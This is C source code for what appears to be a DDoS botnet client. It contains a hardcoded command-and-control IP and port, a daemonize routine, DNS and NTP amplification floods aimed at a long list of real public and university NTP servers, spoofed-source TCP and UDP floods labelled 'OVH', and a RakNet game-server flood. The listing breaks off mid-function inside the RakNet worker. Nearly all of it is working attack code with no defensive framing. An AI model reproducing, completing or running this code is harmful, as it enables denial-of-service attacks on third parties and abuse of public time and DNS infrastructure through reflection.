#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <fcntl.h>
#include <math.h>
#include <stdint.h>
#include <zlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>

#define MAX_PACKET_SIZE 65535
#define PHI 0x9e3779b9
#define BUFFER_SIZE 4096
#define CNC_IP "45.134.39.212"
#define CNC_PORT 4087

static uint32_t Q[4096], c = 362436;
static int sock = -1;
static int running = 1;
static char arch[32] = "linux_x86_64";
static char version[16] = "1.0";
static pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_t attack_thread = 0;
static volatile int attack_running = 0;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
static unsigned int floodport;

char *NTP_SERVERS[] = {
    "0.north-america.pool.ntp.org",
    "1.north-america.pool.ntp.org",
    "2.north-america.pool.ntp.org",
    "3.north-america.pool.ntp.org",
    "0.europe.pool.ntp.org",
    "1.europe.pool.ntp.org",
    "2.europe.pool.ntp.org",
    "3.europe.pool.ntp.org",
    "0.asia.pool.ntp.org",
    "1.asia.pool.ntp.org",
    "2.asia.pool.ntp.org",
    "3.asia.pool.ntp.org",
    "0.oceania.pool.ntp.org",
    "1.oceania.pool.ntp.org",
    "2.oceania.pool.ntp.org",
    "3.oceania.pool.ntp.org",
    "0.south-america.pool.ntp.org",
    "1.south-america.pool.ntp.org",
    "2.south-america.pool.ntp.org",
    "3.south-america.pool.ntp.org",
    "0.africa.pool.ntp.org",
    "1.africa.pool.ntp.org",
    "2.africa.pool.ntp.org",
    "3.africa.pool.ntp.org",
    "time.google.com",
    "time.windows.com",
    "time.apple.com",
    "time.cloudflare.com",
    "pool.ntp.org",
    "0.pool.ntp.org",
    "1.pool.ntp.org",
    "2.pool.ntp.org",
    "3.pool.ntp.org",
    "ntp.ubuntu.com",
    "ntp.fedoraproject.org",
    "ntp.centos.org",
    "clock.fmt.he.net",
    "clock.isc.org",
    "ntp1.hetzner.de",
    "ntp2.hetzner.de",
    "ntp3.hetzner.de",
    "ntp1.t-online.de",
    "ntp2.t-online.de",
    "ntp.ripe.net",
    "ntp1.informatik.uni-erlangen.de",
    "ntp2.informatik.uni-erlangen.de",
    "ntp3.informatik.uni-erlangen.de",
    "ntp1.ptb.de",
    "ntp2.ptb.de",
    "ntp1.ien.it",
    "ntp2.ien.it",
    "ntp1.sp.se",
    "ntp2.sp.se",
    "ntp1.uni-hamburg.de",
    "ntp2.uni-hamburg.de",
    "ntp1.uni-stuttgart.de",
    "ntp2.uni-stuttgart.de",
    "ntp1.uni-heidelberg.de",
    "ntp2.uni-heidelberg.de",
    "chronos.csr.net",
    "ntp1.cs.wisc.edu",
    "ntp2.cs.wisc.edu",
    "ntp1.psu.edu",
    "ntp2.psu.edu",
    "ntp1.cmu.edu",
    "ntp2.cmu.edu",
    "ntp1.stanford.edu",
    "ntp2.stanford.edu",
    "ntp1.mit.edu",
    "ntp2.mit.edu",
    "ntp1.berkeley.edu",
    "ntp2.berkeley.edu",
    "ntp1.ucla.edu",
    "ntp2.ucla.edu",
    "ntp1.utexas.edu",
    "ntp2.utexas.edu",
    "ntp1.umich.edu",
    "ntp2.umich.edu",
    "ntp1.illinois.edu",
    "ntp2.illinois.edu",
    "ntp1.washington.edu",
    "ntp2.washington.edu",
    "ntp1.utoronto.ca",
    "ntp2.utoronto.ca",
    "ntp1.ubc.ca",
    "ntp2.ubc.ca",
    "ntp1.mcgill.ca",
    "ntp2.mcgill.ca",
    "ntp1.imperial.ac.uk",
    "ntp2.imperial.ac.uk",
    "ntp1.ox.ac.uk",
    "ntp2.ox.ac.uk",
    "ntp1.cam.ac.uk",
    "ntp2.cam.ac.uk",
    "ntp1.ucl.ac.uk",
    "ntp2.ucl.ac.uk",
    "ntp1.man.ac.uk",
    "ntp2.man.ac.uk",
    "ntp1.ed.ac.uk",
    "ntp2.ed.ac.uk",
    "ntp1.gla.ac.uk",
    "ntp2.gla.ac.uk",
    "ntp1.bris.ac.uk",
    "ntp2.bris.ac.uk",
    "ntp1.sussex.ac.uk",
    "ntp2.sussex.ac.uk",
    "ntp1.york.ac.uk",
    "ntp2.york.ac.uk",
    "ntp1.lancs.ac.uk",
    "ntp2.lancs.ac.uk",
    "ntp1.leeds.ac.uk",
    "ntp2.leeds.ac.uk",
    "ntp1.shef.ac.uk",
    "ntp2.shef.ac.uk",
    "ntp1.nott.ac.uk",
    "ntp2.nott.ac.uk",
    "ntp1.soton.ac.uk",
    "ntp2.soton.ac.uk",
    "ntp1.bath.ac.uk",
    "ntp2.bath.ac.uk",
    "ntp1.exeter.ac.uk",
    "ntp2.exeter.ac.uk",
    "ntp1.cardiff.ac.uk",
    "ntp2.cardiff.ac.uk",
    "ntp1.qub.ac.uk",
    "ntp2.qub.ac.uk",
    "ntp1.ulster.ac.uk",
    "ntp2.ulster.ac.uk",
    "ntp1.nuigalway.ie",
    "ntp2.nuigalway.ie",
    "ntp1.tcd.ie",
    "ntp2.tcd.ie",
    "ntp1.ucd.ie",
    "ntp2.ucd.ie",
    "ntp1.ucc.ie",
    "ntp2.ucc.ie",
    "ntp1.ul.ie",
    "ntp2.ul.ie",
    "ntp1.dcu.ie",
    "ntp2.dcu.ie",
    "ntp1.dit.ie",
    "ntp2.dit.ie",
    "ntp1.anu.edu.au",
    "ntp2.anu.edu.au",
    "ntp1.unsw.edu.au",
    "ntp2.unsw.edu.au",
    "ntp1.sydney.edu.au",
    "ntp2.sydney.edu.au",
    "ntp1.monash.edu.au",
    "ntp2.monash.edu.au",
    "ntp1.uq.edu.au",
    "ntp2.uq.edu.au",
    "ntp1.adelaide.edu.au",
    "ntp2.adelaide.edu.au",
    "ntp1.uwa.edu.au",
    "ntp2.uwa.edu.au",
    "ntp1.massey.ac.nz",
    "ntp2.massey.ac.nz",
    "ntp1.auckland.ac.nz",
    "ntp2.auckland.ac.nz",
    "ntp1.canterbury.ac.nz",
    "ntp2.canterbury.ac.nz",
    "ntp1.otago.ac.nz",
    "ntp2.otago.ac.nz",
    "ntp1.vuw.ac.nz",
    "ntp2.vuw.ac.nz",
    "ntp1.waikato.ac.nz",
    "ntp2.waikato.ac.nz",
    NULL
};

typedef struct {
    uint8_t* data;
    int len;
    int cap;
} Buffer;

struct list {
    struct sockaddr_in data;
    char domain[256];
    int line;
    struct list *next;
    struct list *prev;
};

struct list *head = NULL;

struct thread_data {
    int thread_id;
    struct list *list_node;
    struct sockaddr_in sin;
    int port;
};

struct DNS_HEADER {
    unsigned short id;
    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;
    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;
    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
};

struct QUESTION {
    unsigned short qtype;
    unsigned short qclass;
};

struct QUERY {
    unsigned char *name;
    struct QUESTION *ques;
};

struct tcp_pseudo {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
};

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    if (setsid() < 0) exit(EXIT_FAILURE);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    umask(0);
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

Buffer* buffer_new() {
    Buffer* b = malloc(sizeof(Buffer));
    b->data = malloc(1024);
    b->len = 0;
    b->cap = 1024;
    return b;
}

void buffer_append(Buffer* b, const uint8_t* data, int len) {
    if (b->len + len > b->cap) {
        b->cap = b->len + len + 1024;
        b->data = realloc(b->data, b->cap);
    }
    memcpy(b->data + b->len, data, len);
    b->len += len;
}

void buffer_u8(Buffer* b, uint8_t v) { buffer_append(b, &v, 1); }
void buffer_u16be(Buffer* b, uint16_t v) { uint8_t d[2] = {v>>8, v&0xFF}; buffer_append(b, d, 2); }
void buffer_u32be(Buffer* b, uint32_t v) { uint8_t d[4] = {v>>24, v>>16, v>>8, v&0xFF}; buffer_append(b, d, 4); }
void buffer_u32le(Buffer* b, uint32_t v) { uint8_t d[4] = {v&0xFF, v>>8, v>>16, v>>24}; buffer_append(b, d, 4); }
void buffer_u64be(Buffer* b, uint64_t v) { for(int i=7; i>=0; i--) { uint8_t d = v>>(i*8); buffer_append(b, &d, 1); } }
void buffer_f32be(Buffer* b, float v) { uint32_t tmp; memcpy(&tmp, &v, 4); buffer_u32be(b, tmp); }
void buffer_str(Buffer* b, const char* s) { int l = strlen(s); buffer_u16be(b, l); buffer_append(b, (uint8_t*)s, l); }

uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) { x++; c++; }
    return (Q[i] = r - x);
}

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

void ChangetoDnsNameFormat(unsigned char* dns, unsigned char* host) {
    int lock = 0, i;
    strcat((char*)host, ".");
    for (i = 0; i < strlen((char*)host); i++) {
        if (host[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = host[lock];
            }
            lock++;
        }
    }
    *dns++ = '\0';
}

unsigned short csum (unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand() % 1025 + 65535);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = inet_addr("162.52.103.30");
}

void setup_tcp_header(struct tcphdr *tcph) {
    tcph->source = htons(1194 + rand_cmwc() % 16276);
    tcph->seq = rand();
    tcph->ack_seq = rand();
    tcph->res2 = 3;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->syn = 1;
    tcph->window = rand();
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

void setup_udp_header(struct udphdr *udph) {
    udph->source = htons(5678);
    udph->dest = htons(123);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x17\x00\x03\x2a\x00\x00\x00\x00", 8);
    udph->len = htons(sizeof(struct udphdr) + 8);
}

void ParseResolverLine(char *strLine, int iLine) {
    char caIP[32] = "";
    char caDNS[512] = "";
    int i;
    int moved = 0;
    for (i = 0; i < strlen(strLine); i++) {
        if (strLine[i] == ' ' || strLine[i] == '\n' || strLine[i] == '\t') {
            moved++;
            continue;
        }
        if (moved == 0) {
            caIP[strlen(caIP)] = (char) strLine[i];
        } else if (moved == 1) {
            caDNS[strlen(caDNS)] = (char) strLine[i];
        }
    }
    if (head == NULL) {
        head = (struct list *)malloc(sizeof(struct list));
        bzero(&head->data, sizeof(head->data));
        head->data.sin_addr.s_addr = inet_addr(caIP);
        head->data.sin_port = htons(53);
        strcpy(head->domain, caDNS);
        head->line = iLine;
        head->next = head;
        head->prev = head;
    } else {
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        memset(new_node, 0x00, sizeof(struct list));
        new_node->data.sin_addr.s_addr = inet_addr(caIP);
        new_node->data.sin_port = htons(53);
        strcpy(new_node->domain, caDNS);
        new_node->prev = head;
        head->line = iLine;
        new_node->next = head->next;
        head->next = new_node;
    }
}

void* dns_worker(void* arg) {
    struct thread_data *td = (struct thread_data *)arg;
    char strPacket[MAX_PACKET_SIZE];
    int iPayloadSize = 0;
    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    int iPort = td->port;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    init_rand(time(NULL));
    memset(strPacket, 0, MAX_PACKET_SIZE);
    struct iphdr *iph = (struct iphdr *) &strPacket;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + 38;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
    iPayloadSize += sizeof(struct iphdr);
    struct udphdr *udph = (struct udphdr *) &strPacket[iPayloadSize];
    udph->source = htons(iPort);
    udph->dest = htons(53);
    udph->check = 0;
    iPayloadSize += sizeof(struct udphdr);
    struct DNS_HEADER *dns = (struct DNS_HEADER *) &strPacket[iPayloadSize];
    dns->id = (unsigned short) htons(rand_cmwc());
    dns->qr = 0;
    dns->opcode = 0;
    dns->aa = 0;
    dns->tc = 0;
    dns->rd = 1;
    dns->ra = 0;
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1);
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = htons(1);
    iPayloadSize += sizeof(struct DNS_HEADER);
    sin.sin_port = udph->source;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) strPacket, iph->tot_len >> 1);
    char strDomain[256];
    int i;
    int iAdditionalSize = 0;
    while (attack_running) {
        usleep(0);
        list_node = list_node->next;
        memset(&strPacket[iPayloadSize + iAdditionalSize], 0, iAdditionalSize);
        iAdditionalSize = 0;
        unsigned char *qname = (unsigned char*) &strPacket[iPayloadSize + iAdditionalSize];
        strcpy(strDomain, list_node->domain);
        ChangetoDnsNameFormat(qname, strDomain);
        iAdditionalSize += strlen(qname) + 1;
        struct QUESTION *qinfo = (struct QUESTION *) &strPacket[iPayloadSize + iAdditionalSize];
        qinfo->qtype = htons(255);
        qinfo->qclass = htons(1);
        iAdditionalSize += sizeof(struct QUESTION);
        void *edns = (void *) &strPacket[iPayloadSize + iAdditionalSize];
        memset(edns+2, 0x29, 1);
        memset(edns+3, 0x23, 1);
        memset(edns+4, 0x28, 1);
        iAdditionalSize += 11;
        iph->daddr = list_node->data.sin_addr.s_addr;
        udph->len = htons((iPayloadSize + iAdditionalSize + 5) - sizeof(struct iphdr));
        iph->tot_len = iPayloadSize + iAdditionalSize + 5;
        udph->source = htons(rand_cmwc() & 0xFFFF);
        iph->check = csum ((unsigned short *) strPacket, iph->tot_len >> 1);
        for (i = 0; i < 5; i++) {
            sendto(s, strPacket, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        }
    }
    close(s);
    return NULL;
}

void resolve_ntp_servers() {
    struct sockaddr_in *resolved = malloc(sizeof(struct sockaddr_in) * 200);
    int count = 0;
    for (int i = 0; NTP_SERVERS[i] != NULL && count < 200; i++) {
        struct hostent *he = gethostbyname(NTP_SERVERS[i]);
        if (he != NULL) {
            struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
            for (int j = 0; addr_list[j] != NULL && count < 200; j++) {
                resolved[count].sin_family = AF_INET;
                resolved[count].sin_addr = *addr_list[j];
                resolved[count].sin_port = htons(123);
                if (head == NULL) {
                    head = (struct list *)malloc(sizeof(struct list));
                    bzero(&head->data, sizeof(head->data));
                    head->data.sin_addr = resolved[count].sin_addr;
                    head->data.sin_port = htons(123);
                    head->next = head;
                    head->prev = head;
                } else {
                    struct list *new_node = (struct list *)malloc(sizeof(struct list));
                    memset(new_node, 0x00, sizeof(struct list));
                    new_node->data.sin_addr = resolved[count].sin_addr;
                    new_node->data.sin_port = htons(123);
                    new_node->prev = head;
                    new_node->next = head->next;
                    head->next = new_node;
                }
                count++;
            }
        }
    }
    free(resolved);
}

void* ntp_worker(void* arg) {
    struct thread_data *td = (struct thread_data *)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    init_rand(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);
    udph->source = htons(rand() % 65535 - 1026);
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0) {
        close(s);
        return NULL;
    }
    init_rand(time(NULL));
    register unsigned int i = 0;
    while (attack_running) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        pps++;
        if (i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
    close(s);
    return NULL;
}

void* ovh_tcp_worker(void* arg) {
    char *td = (char *)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) return NULL;
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);
    tcph->dest = htons(floodport);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0) {
        close(s);
        return NULL;
    }
    init_rand(time(NULL));
    register unsigned int i = 0;
    while (attack_running) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->dest = htons(floodport);
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->check = 1;
        tcph->check = tcpcsum(iph, tcph);
        pps++;
        if (i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
    close(s);
    return NULL;
}

void* ovh_udp_worker(void* arg) {
    char *td = (char *)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        close(s);
        return NULL;
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    init_rand(time(NULL));
    register unsigned int i = 0;
    while (attack_running) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 64;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->daddr = sin.sin_addr.s_addr;
        udph->source = htons(rand_cmwc() & 0xFFFF);
        udph->dest = htons(floodport);
        udph->len = htons(sizeof(struct udphdr) + 64);
        udph->check = 0;
        unsigned char *payload = (unsigned char *)udph + sizeof(struct udphdr);
        for (int j = 0; j < 64; j++) {
            payload[j] = rand_cmwc() & 0xFF;
        }
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        pps++;
        if (i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
    close(s);
    return NULL;
}

void* ovh_udp_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    char* limiter_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !threads_str || !limiter_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int num_threads = atoi(threads_str);
    floodport = atoi(port_str);
    int maxpps = atoi(limiter_str);
    int duracao = atoi(dur_str);
    if (num_threads > 200) num_threads = 200;
    limiter = 0;
    pps = 0;
    sleeptime = 100;
    pthread_t thread[num_threads];
    int multiplier = 20;
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, ovh_udp_worker, (void *)target);
    }
    for (int i = 0; i < (duracao * multiplier); i++) {
        usleep((1000/multiplier)*1000);
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) {
                sleeptime += 100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if (sleeptime > 25) {
                sleeptime -= 25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(thread[i]);
        pthread_join(thread[i], NULL);
    }
    free(params);
    return NULL;
}

void* raknet_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    char* size_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int duracao = atoi(dur_str);
    int num_threads = threads_str ? atoi(threads_str) : 10;
    int pkt_size = size_str ? atoi(size_str) : 512;
    int port = atoi(port_str);
    if (num_threads > 50) num_threads = 50;
    if (pkt_size < 64) pkt_size = 64;
    if (pkt_size > 1472) pkt_size = 1472;
    pthread_t* threads = malloc(num_threads * sizeof(pthread_t));
    int* sockfds = malloc(num_threads * sizeof(int));
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target, &sin.sin_addr);
    for (int i = 0; i < num_threads; i++) {
        sockfds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfds[i] < 0) continue;
        int bufsize = 1024 * 1024 * 4;
        setsockopt(sockfds[i], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    }
    void* raknet_worker(void* arg) {
        int idx = *(int*)arg;
        int sockfd = sockfds[idx];
        if (sockfd < 0) return NULL;
        uint8_t* packet = malloc(pkt_size);
        uint32_t seq = rand_cmwc();
        uint32_t ping_id = rand_cmwc();
        struct sockaddr_in addr;
        memcpy(&addr, &sin, sizeof(addr));
        time_t end = time(NULL) + duracao;
        while (attack_running && time(NULL) < end) {
            memset(packet, rand_cmwc() & 0xFF, pkt_size);
            packet[0] = 0x80;
            packet[1] = 0x00;
            packet[2] = 0x00;
            packet[3] = 0x00;
            packet[4] = 0x01;
            packet[5] = 0x00;
            packet[6] = 0x00;
            packet[7] = 0x00;
            if ((rand_cmwc() % 3) == 0) {
                packet[0] = 0x82;
                packet[1] = (seq >> 24) & 0xFF;
                packet[2] = (seq >> 16) & 0xFF;
                packet[3] = (seq >> 8) & 0xFF;
                packet[4] = seq & 0xFF;
                seq++;
            }
            if ((rand_cmwc() % 5) == 0) {
                packet[0] = 0x01;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x0C;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
                memcpy(packet + 8, &ping_id, 4);
                ping_id += rand_cmwc() % 100;
            }
            if ((rand_cmwc() % 4) == 0) {
                packet[0] = 0x05;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
            }
            if ((rand_cmwc() % 6) == 0) {
                packet[0] = 0x83;
                packet[1] = (seq >> 24) & 0xFF;
                packet[2] = (seq >> 16) & 0xFF;
                packet[3] = (seq >> 8) & 0xFF;
                packet[4] = seq & 0xFF;
                seq++;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
                packet[8] = 0x60;
                packet[9] = 0x00;
                packet[10] = 0x00;
                packet[11] = 0x00;
            }
            if ((rand_cmwc() % 7) == 0) {
                packet[0] = 0x84;
                packet[1] = (seq >> 24) & 0xFF;
                packet[2] = (seq >> 16) & 0xFF;
                packet[3] = (seq >> 8) & 0xFF;
                packet[4] = seq & 0xFF;
                seq++;
                packet[5] = 0x60;
                packet[6] = (pkt_size * 8 >> 8) & 0xFF;
                packet[7] = (pkt_size * 8) & 0xFF;
            }
            if ((rand_cmwc() % 8) == 0) {
                packet[0] = 0x85;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
                packet[8] = 0x00;
                packet[9] = 0x00;
                packet[10] = 0x00;
                packet[11] = 0x00;
            }
            if ((rand_cmwc() % 10) == 0) {
                packet[0] = 0x86;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
                packet[8] = 0x00;
                packet[9] = 0x00;
                packet[10] = 0x00;
                packet[11] = 0x00;
            }
            if ((rand_cmwc() % 12) == 0) {
                packet[0] = 0x87;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
            }
            if ((rand_cmwc() % 15) == 0) {
                packet[0] = 0x88;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
                packet[8] = 0x00;
                packet[9] = 0x00;
                packet[10] = 0x00;
                packet[11] = 0x00;
                packet[12] = 0x00;
                packet[13] = 0x00;
                packet[14] = 0x00;
                packet[15] = 0x00;
            }
            if ((rand_cmwc() % 20) == 0) {
                packet[0] = 0x89;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
            }
            if ((rand_cmwc() % 25) == 0) {
                packet[0] = 0x8A;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
            }
            int flags = rand_cmwc() % 5;
            if (flags == 0) {
                packet[0] |= 0x40;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
            }
            if ((rand_cmwc() % 100) < 3) {
                packet[0] = 0x92;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
            }
            if ((rand_cmwc() % 100) < 2) {
                packet[0] = 0x93;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
